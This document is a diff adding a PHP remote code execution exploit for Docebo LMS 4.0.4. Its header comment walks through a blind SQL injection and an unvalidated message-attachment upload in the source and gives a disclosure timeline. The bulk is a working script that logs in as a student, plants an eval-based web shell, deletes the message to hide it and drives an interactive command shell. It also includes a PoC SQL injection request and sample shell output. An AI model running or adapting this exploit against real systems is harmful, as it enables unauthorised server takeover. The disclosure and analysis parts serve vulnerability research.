@@ -1,0 +1,620 @@
+<?php
+/*
+Docebo LMS <= v4.0.4 (messages) remote code execution exploit
+vendor_________: http://www.docebo.com/
+software link__: http://www.docebo.com/community/doceboCms/
+author_________: mr_me::rwx kru
+email__________: steventhomasseeley!gmail!com
+
+"We must become the change we want to see in the world." -Gandhi
+-------------------------------------------------------------
+description:
+DoceboLMS is a SCORM compliant Open Source Cloud E-Learning platform used in corporate, government 
+and education markets. The Platform supports 25 languages and can be used with different didactic 
+models (Blended, Self-Directed, Collaborative and even Social Learning).
+
+The application allows a superadministrator to inject and execute arbitray SQL into the
+backend database via an insert statment. Working, but its pointless.
+
+Additionally, the application allows a low privlidged attacker (student or higher) to upload/inject 
+php code by creating a message attachment and sending it to a nonexistent user. After this, an attacker 
+can simply view the "sent" message only to then find their web shell conviently renamed.
+----------------------------------------------------------------------------------
+
+SQL Injection:
+==============
+We start our code journey in lines 47-49 of ./doceboCore/index.php where we create the module.
+Then, lines 83-86 sets up the call to loadBody(): 
+
+-->
+if($GLOBALS['modname'] != '') {
+        $module_cfg =& createModule($GLOBALS['modname']);
+}
+
+............
+
+} elseif($GLOBALS['modname'] != '') {
+
+        $module_cfg->loadBody();
+}
+<--
+
+within ./lib/lib.istance.php, the createModule() function is defined and includes code for us to perform the
+loadBody() function on lines 60-64.
+
+-->
+function &createModule($module_name, $class_name = NULL) {
+
+..................
+
+	if(file_exists($where.'/class.module/class.'.$module_name.'.php')) {
+
+		require_once($where.'/class.module/class.'.$module_name.'.php');
+		if( $class_name === NULL ) $class_name = $def_class_name.'_'.ucfirst($module_name);
+	}
+
+..................
+	
+	return $module_cfg;
+}
+<--
+
+lines 56 of ./class.module/class.iotask.php is where the loadBody function is delcared. 
+Later on lines 112 the function checks for the 'addconnection' is set in the GET request and calls 
+ioTask_UIConnectionNew() on the current object.
+
+-->
+function loadBody() {
+
+.......................
+
+		} elseif( isset($_GET['addconnection']) && !isset($_POST['cancel']) ) {
+			ioTask_UIConnectionNew($this, '', '' );
+<--
+
+lines 244 of ./doceboCore/modules/iotask/iotask.php defines the function ioTask_UIConnectionNew()
+on lines 255-264 we pass input from the GET/POST parameters to a function called parse_input()
+which simply sets the current configuration with our specfied 'coursereportuiconfig[name]' and 
+'coursereportuiconfig[description]' variables on the DoceboConnectorCourseExport instance. 
+Again, on lines 266-269 the code checks to see if the variable $action is set to 'finish' and if so
+it calls the save_connection() function with our injected DoceboConnectorCourseExport instance.
+
+-->
+function ioTask_UIConnectionNew( &$module, $action, $subop ) {
+
+...........
+
+	if( $subop == 'edit_connection' ) {
+		$connection = $connMgr->create_connection_byname(key($action));
+	} else {
+		$connection = $connMgr->create_connector_bytype($_POST['type_connection']);
+	}
+	$connectionUI = $connection->get_configUI();
+	print_r($connectionUI);
+	$connectionUI->set_lang($lang);
+	$connectionUI->set_form($form);
+	$connectionUI->parse_input($_GET, $_POST);
+
+	if( is_array($action) ) {
+		if( key($action) == 'finish' ) {
+			$connectionUI->go_finish();
+			if( $connMgr->save_connection( $connectionUI->get_old_name(), $connection ) )
+<--
+
+finally, lines 163-180 of ./doceboCore/lib/lib.iotask.php the save_connection function contains 
+the actual sql query:
+-->
+	function save_connection( $old_name, $connection ) {
+		$name = $connection->get_name();
+		$description = $connection->get_description();
+		$type = $connection->get_type_name();
+		$params = $connection->get_config();
+		$str_params = urlencode(serialize($params));
+		$lang =& $this->get_lang();
+		
+		if( strlen(trim($name)) == 0 ) {
+			$this->last_error = $lang->def('_OPERATION_FAILURE');
+			return FALSE;
+		}
+		
+		if( $old_name === '' ) {
+			$query = "INSERT INTO ".$GLOBALS['prefix_fw']."_connection"
+					."(name,description,type,params)" 
+					." VALUES "
+					."('$name','$description','$type','$str_params')";
+<--
+
+Both the 'coursereportuiconfig[name]' and 'coursereportuiconfig[description]' variables are vulnerable to
+attack, but of course you need at least read access (ie teacher or admin):
+
+An attacker can use blind sql injection to exploit this vulnerability very easily. However, they will need a valid 
+'authentic_request' and 'docebo_session' variables set in the request. The interesting thing is, the 'name' field
+in the db table is actually the primary key. So if you make multiple requests with the same 'name', the SQL
+Injection will execute but the integrity constraint will trigger and thus, not insert a record. sweet.
+
+Example SQL injection: suntzu','course-export-connector',(CASE WHEN substr((SELECT version()),1,1)='5' THEN benchmark(5000000,md5(1)) ELSE 0 END))--+
+
+PoC Request:
+POST /webapps/dc/doceboCore/index.php?modname=iotask&op=display&addconnection&gotab=connections HTTP/1.1
+Host: 192.168.220.128
+Cookie: docebo_session=pbkipn2uvsf4cjive88aadlnf1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 659
+
+authentic_request=debe0efcb991e3e3506fe10b99dc90d2&type_connection=course-export-connector&coursereportuiconfig%5Bname%5D=q&coursereportuiconfig%5Bdescription%5D=suntzu','course-export-connector',(CASE WHEN substr((SELECT version()),1,1)='4' THEN benchmark(5000000,md5(1)) ELSE 0 END))--+&coursereportuiconfig%5Bfirst_row_header%5D=1&coursereportuiconfig%5Bmemory%5D=a%253A5%253A%257Bs%253A4%253A%2522name%2522%253Bs%253A14%253A%2522New%2Bconnection%2522%253Bs%253A11%253A%2522description%2522%253Bs%253A0%253A%2522%2522%253Bs%253A16%253A%2522first_row_header%2522%253Bs%253A1%253A%25221%2522%253Bs%253A4%253A%2522step%2522%253Bs%253A1%253A%25220%2522%253Bs%253A8%253A%2522old_name%2522%253Bs%253A0%253A%2522%2522%253B%257D&action%5Bnew_connection%5D%5Bfinish%5D=Finish
+
+Many other SQL Injections can be found and exploited easily in the forum and wiki (with low priv)... but yeah, whatever.
+
+Arbitray file upload:
+=====================
+
+line 35 of ./doceboLMS/index.php sets the GLOBAL array index 'modname' to our supplied value:
+-->
+$GLOBALS['modname'] = Get::req('modname', DOTY_ALPHANUM, '');
+<--
+
+then, lines 62-65 of ./doceboLMS/index.php triggers the createModule() function:
+-->
+if(!empty($GLOBALS['modname'])) {
+	$module_cfg =& createModule($GLOBALS['modname']);
+	if(method_exists($module_cfg, 'beforeLoad')) $module_cfg->beforeLoad();
+}
+<--
+
+lines 27-40 of ./doceboLms/lib/lib.istance.php createModule function contains a couple of includes..:
+-->
+function createModule($module_name, $class_name = NULL) {
+	$module_name = preg_replace('/[^a-zA-Z0-9\-\_]+/', '', $module_name);
+	if(file_exists(dirname(__FILE__).'/../class.module/class.'.$module_name.'.php')) {
+		
+		include_once(dirname(__FILE__).'/../class.module/class.'.$module_name.'.php');
+		if( $class_name === NULL ) $class_name = 'Module_'.ucfirst($module_name); 
+	} else {
+
+		include_once(dirname(__FILE__).'/../class.module/class.definition.php');
+		$class_name = 'LmsModule';
+	}
+	$module_cfg = new $class_name();
+	return $module_cfg;
+}
+<--
+
+After the module is created, lines 110-113 of ./doceboLMS/index.php loads the module body:
+-->
+// load module body
+if(!empty($GLOBALS['modname'])) {
+	$module_cfg->loadBody();
+}
+<--
+
+lines 11-16 of ./doceboLMS/class.module/class.message.php triggers the messageDispatch() function
+using the 'op' parameter:
+-->
+class Module_Message extends LmsModule {
+	
+	function loadBody() {
+		
+		require_once($GLOBALS['where_lms'].'/modules/message/message.php');
+		messageDispatch($GLOBALS['op']);
+	}
+<--
+
+
+lines 1114-1131 of ./doceboCore/lib/lib.message.php so that if the 'op' variable is set to 
+'writemessage' teh the code will trigger a call to writemessage() on the object:
+function messageDispatch($op, $mvc = false) {
+
+	if(isset($_POST['undo'])) 	$op = 'message';
+	if(isset($_POST['okselector'])) 	$op = 'writemessage';
+	if(isset($_POST['cancelselector'])) $op = 'message';
+	if(isset($_POST['back_recipients'])) $op = 'addmessage';
+
+	$module = new MessageModule($mvc);
+
+	switch($op) {
+		case "message" : {
+			$module->message();
+		};break;
+		case "addmessage" : {
+			$module->addmessage();
+		};break;
+		case "writemessage" : {
+			$module->writemessage();
+
+
+<--
+
+within function writemessage() on lines 635 - 644 of ./doceboCore/lib/lib.message.php 
+we can see a call to saveMessageAttach() if the $_FILES array is populated from the file upload:
+-->
+		if(isset($_POST['send'])) {
+	
+			if($_POST['message']['subject'] == '') {
+				$output .= getErrorUi(Lang::t('_MUST_INS_SUBJECT'));
+			} else {
+				// send message
+				$attach = '';
+				if($_FILES['message']['tmp_name']['attach'] != '') {
+					$attach = $this->saveMessageAttach($_FILES['message']);
+				}
+<--
+
+lines 32-49 of ./doceboCore/lib/lib.message.php we can see how the filename is created:
+using the current users id, using mt_rand(), time() finally followed by the filename itself.
+-->
+	function saveMessageAttach($attach) {
+		require_once(_base_.'/lib/lib.upload.php');
+	
+		$path = _PATH_MESSAGE;
+		$file = '';
+		sl_open_fileoperations();
+		if(isset($attach['tmp_name']['attach']) && $attach['tmp_name']['attach'] != '') {
+	
+			$file = getLogUserId().'_'.mt_rand(0, 100).'_'.time().'_'.$attach['name']['attach'];
+			if(!sl_upload($attach['tmp_name']['attach'], $path.$file)) {
+				$error = 1;
+				$file = '';
+			}
+		}
+		sl_close_fileoperations();
+		if(!$error) return $file;
+		return false;
+	}
+<--
+
+lines 68-78 of ./lib/lib.upload.php checks the configuration for the upload type (default is filesystem)
+-->
+function sl_upload( $srcFile, $dstFile ) {
+	$uploadType = Get::cfg('uploadType');
+	$dstFile =stripslashes($dstFile);
+	if( $uploadType == "ftp" ) {
+		return sl_upload_ftp( $srcFile, $dstFile );
+	} elseif( $uploadType == "cgi" ) {
+		return sl_upload_cgi( $srcFile, $dstFile );
+	} else {
+		return sl_upload_fs( $srcFile, $dstFile );
+	}
+}
+<--
+
+lines 136 - 140 of ./lib/lib.upload.php actually performs the move_uploaded_file() function
+-->
+
+function sl_upload_fs( $srcFile, $dstFile ) {
+
+	$re = move_uploaded_file($srcFile, $GLOBALS['where_files_relative'].$dstFile);
+	if(!$re) die("Error on move_uploaded_file from: $srcFile to $dstFile");
+	return $re;
+}
+<--
+
+All done without any validation on the file whatsoever. It should also be pointed
+out that many other file uploads exist in the application that can also be abused.
+
+I just point out one example of each bug so the developers can hopefully spot and fix all of them.
+----------------------------------------------------------------------------------
+
+Timeline:
+- 01/12 discovered the bugs
+- 02/12 wrote the exploit
+- 04/12 reported bugs to the vendor http://bit.ly/rCGCsY
+- 05/12 Vendor confirms they got the bugs and are working on a fix
+- 05/12 acknowledgment http://bit.ly/u7qoD5
+- 07/12 request a status update / timeframe http://bit.ly/w4ndcE
+- 08/12 no response, reminder http://bit.ly/rPdNCd
+- 09/12 no response? No remorse.
+- 10/12 public disclosure
+-----------------------------------
+mr_me@gliese:~/pentest/web/0day/docebo$ php poc.php -t 192.168.220.128 -d /webapps/docebo/ -p 127.0.0.1:8080 
+
+----------------------------------------------------------
+Docebo LMS v4.0.4 (messages) remote code execution exploit
+by mr_me of rwx kru - net-ninja.net / rwx.biz.nf
+----------------------------------------------------------
+(+) Setting the proxy to 127.0.0.1:8080
+(+) Grabbing session: docebo_session=lknh500ldp9avllmq5af5q3v96
+(+) Grabbing login token: e5c8bb27d018ef97503b9c3c9eb8a53e
+(+) Logged into the application..
+(+) Grabbing Logged in session: docebo_session=5up5becmbsv7mdaun6i9mp5i63
+(+) Grabbing upload token: e5c8bb27d018ef97503b9c3c9eb8a53e
+(+) Creating malicious php message..
+(+) Finding message id..
+(+) Found message id: 18
+(+) Finding web shell..
+(+) Found web shell: 11837_90_1322716955_suntzu.php
+(+) Deleting backdoored message.. 
+(+) Sucessfully deleted the message
+(+) Dropping to shell interaction..
+
+mr_me@192.168.220.128# id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+mr_me@192.168.220.128# uname -a
+Linux steve-web-server 2.6.35-31-generic #62-Ubuntu SMP Tue Nov 8 14:00:30 UTC 2011 i686 GNU/Linux
+mr_me@192.168.220.128#q
+*/
+
+print_r("
+----------------------------------------------------------
+Docebo LMS v4.0.4 (messages) remote code execution exploit
+by mr_me of rwx kru - net-ninja.net / rwx.biz.nf
+----------------------------------------------------------
+");
+
+if ($argc < 3) {
+print_r("
+-----------------------------------------------------------------------------
+Usage: php ".$argv[0]." -t <host:ip> -d <path> OPTIONS
+host:      target server (ip/hostname)
+path:      directory path to wordpress
+Options:
+ -p[ip:port]: specify a proxy
+Example:
+php ".$argv[0]." -t 192.168.1.5 -d /docebo/ -p 127.0.0.1:8080
+php ".$argv[0]." -t 192.168.1.5 -d /docebo/
+-----------------------------------------------------------------------------
+"); die; 
+}
+
+/* 
+
+   +-----------------+ 
+   student credentials
+   +-----------------+
+
+*/
+$user = "suntzu";
+$pswd = "suntzu";
+
+/* ----EOF--- */
+
+error_reporting(7);
+ini_set("max_execution_time", 0);
+ini_set("default_socket_timeout", 5);
+
+$proxy_regex = "(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b)";
+
+function setArgs($argv){
+	$_ARG = array();
+	foreach ($argv as $arg){
+		if (ereg("--([^=]+)=(.*)", $arg, $reg)){
+			$_ARG[$reg[1]] = $reg[2];
+		}elseif(ereg("^-([a-zA-Z0-9])", $arg, $reg)){
+			$_ARG[$reg[1]] = "true";
+		}else {
+			$_ARG["input"][] = $arg;
+		}
+	}
+	return $_ARG;
+}
+
+$myArgs = setArgs($argv);
+$host = $myArgs["input"]["1"];
+$path = $myArgs["input"]["2"];
+
+if (strpos($host, ":") == true){
+	$hostAndPort = explode(":",$myArgs["input"][1]);
+	$host = $hostAndPort[0];
+	$port = (int)$hostAndPort[1];
+}else{
+	$port = 80;
+}
+
+
+if(strcmp($myArgs["p"],"true") === 0){
+	$proxyAndPort = explode(":",$myArgs["input"][3]);
+	$proxy = $proxyAndPort[0];
+	$pport = $proxyAndPort[1];
+
+	echo "(+) Setting the proxy to ".$proxy.":".$pport."\r\n";
+}else{
+    	echo "(-) Warning, a proxy was not set\r\n";
+}
+
+// rgods sendpacketii() function
+function sendpacket($packet){
+	global $myArgs, $proxy, $host, $pport, $port, $html, $proxy_regex;
+	if (strcmp($myArgs["p"],"true") != 0) {
+		$ock = fsockopen(gethostbyname($host),$port);
+		if (!$ock) {
+			echo "(-) No response from ".$host.":".$port; die;
+		}
+	}
+	else {
+		$c = preg_match($proxy_regex,$proxy);
+		if (!$c) {
+			echo "(-) Not a valid proxy...\n"; die;
+		}
+		$ock=fsockopen($proxy,$pport);
+		if (!$ock) {
+			echo "(-) No response from proxy..."; die;
+		}
+	}
+	fputs($ock,$packet);
+	if ($proxy == "") {
+		$html = "";
+		while (!feof($ock)) {
+			$html .= fgets($ock);
+		}
+	}else {
+		$html = "";
+		while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a), $html))) {
+			$html .= fread($ock,1);
+		}
+	}
+	fclose($ock);
+}
+
+if (strcmp($myArgs["p"], "true") != 0) {$p = $path;} else {$p = "http://".$host.":".$port.$path;}
+
+function get_session($html){
+	if (!preg_match("/Set-Cookie: ([^;]*);/", $html, $session)){
+		die("\n[-] docebo_session not set!\n");
+	}
+	return $session[1];
+}
+
+function get_token($html){
+	if (!preg_match("/authentic_request\" value=\"([^\"]*)/", $html, $token)){
+		die("\n[-] authentic_request token not found!\n");
+	}
+	return $token[1];
+}
+
+function validate_login($html){
+	if (!preg_match("/Location: ([^\r\n]*)\r\n/", $html, $redirect)){
+		return 0;
+	}
+	$access_chk = explode("?",$redirect[1]);
+	if (strcmp($access_chk[1],"access_fail=1") === 0){
+		return 0;	
+	}
+	return 1;
+}
+
+
+// get the 'authentic_request' token & the sessionID
+$packet  = "GET ".$p."index.php HTTP/1.1\r\n";
+$packet .= "host: ".$host."\r\n\r\n";
+sendpacket($packet);
+
+$session = get_session($html);
+$token = get_token($html);
+
+echo "(+) Grabbing session: ".$session."\n";
+echo "(+) Grabbing login token: ".$token."\n";
+
+// login
+$data = "authentic_request=".$token."&login_userid=".$user."&login_pwd=".$pswd."&log_button=Login";
+$login_pkt  = "POST ".$p."doceboLms/index.php?modname=login&op=confirm HTTP/1.1\r\n";
+$login_pkt .= "Host: ".$host."\r\n";
+$login_pkt .= "Cookie: ".$session."\r\n";
+$login_pkt .= "Content-Type: application/x-www-form-urlencoded\r\n";
+$login_pkt .= "Content-Length: ".strlen($data)."\r\n\r\n".$data;
+sendpacket($login_pkt);
+
+if (validate_login($html)){
+	echo "(+) Logged into the application..\n";
+}else{
+
+	die("(-) Login failed!\n");	
+}
+
+$session = get_session($html);
+echo "(+) Grabbing Logged in session: ".$session."\n";
+
+// now for the upload
+$packet  = "GET ".$p."doceboLms/index.php?modname=message&op=addmessage&from=out HTTP/1.1\r\n";
+$packet .= "Host: ".$host."\r\n";
+$packet .= "Cookie: ".$session."\r\n\r\n";
+sendpacket($packet);
+$token = get_token($html);
+
+echo "(+) Grabbing upload token: ".$token."\n";
+$php_code = "<?php error_reporting(0); eval(base64_decode(\$_SERVER[HTTP_HAX])) ?>";
+$payload  = "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"authentic_request\"\r\n\r\n";
+$payload .= $token."\r\n";
+$payload .= "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"out\"\r\n\r\n";
+$payload .= "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"msg_course_filter\"\r\n\r\n";
+$payload .= "0\r\n";
+$payload .= "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"message[recipients]\"\r\n\r\n";
+// send to a nonexistant userid
+$payload .= urlencode("a:1:{i:0;s:5:\"0\";}")."\r\n";
+$payload .= "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"message[subject]\"\r\n\r\n";
+$payload .= "suntzu\r\n";
+$payload .= "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"message[priority]\"\r\n\r\n";
+$payload .= "1\r\n";
+$payload .= "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"message_textof\"\r\n\r\n";
+$payload .= "suntzu\r\n";
+$payload .= "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"message[attach]\"; filename=\"suntzu.php\"\r\n\r\n";
+$payload .= $php_code."\r\n";
+$payload .= "--o0oOo0o\r\n";
+$payload .= "Content-Disposition: form-data; name=\"send\"\r\n\r\n";
+$payload .= "Send\r\n";				
+$payload .= "--o0oOo0o\r\n";
+
+$killpkt = "POST ".$p."doceboLms/index.php?modname=message&op=writemessage HTTP/1.1\r\n";
+$killpkt .= "Host: ".$host."\r\n";
+$killpkt .= "Cookie: ".$session."\r\n";
+$killpkt .= "Content-Type: multipart/form-data; boundary=o0oOo0o\r\n";
+$killpkt .= "Content-Length: ".strlen($payload)."\r\n";
+$killpkt .= "Connection: close\r\n\r\n".$payload;
+
+echo "(+) Creating malicious php message..\n";
+sendpacket($killpkt);
+
+// now to find the shell
+echo "(+) Finding message id..\n";
+$packet  = "GET ".$p."doceboLms/index.php?modname=message&op=message&sop=unregistercourse HTTP/1.1\r\n";
+$packet .= "Host: ".$host."\r\n";
+$packet .= "Cookie: ".$session."\r\n\r\n";
+sendpacket($packet);
+
+if (!preg_match("/id_message=([^\"]*)/", $html, $message)){
+	die("\n[-] Unable to find sent message id!\n");
+}else{
+	echo "(+) Found message id: ".$message[1]."\n";
+}
+
+echo "(+) Finding web shell..\n";
+$packet  = "GET ".$p."doceboLms/index.php?modname=message&op=readmessage&id_message=".$message[1]." HTTP/1.1\r\n";
+$packet .= "Host: ".$host."\r\n";
+$packet .= "Cookie: ".$session."\r\n\r\n";
+sendpacket($packet);
+
+if (!preg_match("/alt=\"mime\" \/\>([^<]*)/", $html, $shell)){
+	die("\n[-] Unable to find web shell :/\n");
+}else{
+	echo "(+) Found web shell: ".$shell[1]."\n";
+	
+}
+
+$phpshell = $shell[1];
+
+echo "(+) Deleting backdoored message.. \n";
+$deletemessage  = "doceboLms/index.php?modname=message&op=delmessage&id_message=".$message[1];
+$deletemessage .= "&out=out&confirm=1";
+$packet  = "GET ".$p.$deletemessage." HTTP/1.1\r\n";
+$packet .= "Host: ".$host."\r\n";
+$packet .= "Cookie: ".$session."\r\n\r\n";
+sendpacket($packet);
+
+if (preg_match("/Location: ([^\r\n]*)\r\n/", $html, $delete_test)){
+	if (preg_match("/result=([^\r\n]*)/", $delete_test[1],$ok_del)){
+		if (strcmp("$ok_del[1]","ok_del") === 0){
+			echo "(+) Sucessfully deleted the message\n";
+		}
+	}
+}else{
+	echo("\n(-) Warning: unable to deleted the message :/\n");
+}
+
+echo "(+) Dropping to shell interaction..\n";
+
+// change the php function if your target doesnt support it
+$php_functions = array("passthru", "system");
+$php_func = array_rand($php_functions, 2);
+$php_func = $php_functions[$php_func[0]];
+
+while ($cmd != "q"){
+	echo "\n".get_current_user()."@".$host."# ";
+	$cmd = trim(fgets(STDIN));
+	$c = base64_encode($php_func."("."\"".$cmd."\"".");");
+	$packet  = "POST ".$p."files/doceboLms/message/".$phpshell." HTTP/1.1\r\n";
+	$packet .= "Host: ".$host."\r\n";
+	$packet .= "Content-Type: application/x-www-form-urlencoded\r\n";
+	$packet .= "Hax: ".$c."\r\n\r\n";
+	if ($cmd != "q"){
+		sendpacket($packet);
+		$html = explode("html",$html);
+		echo (trim($html[1]));
+    	}
+}
+?>
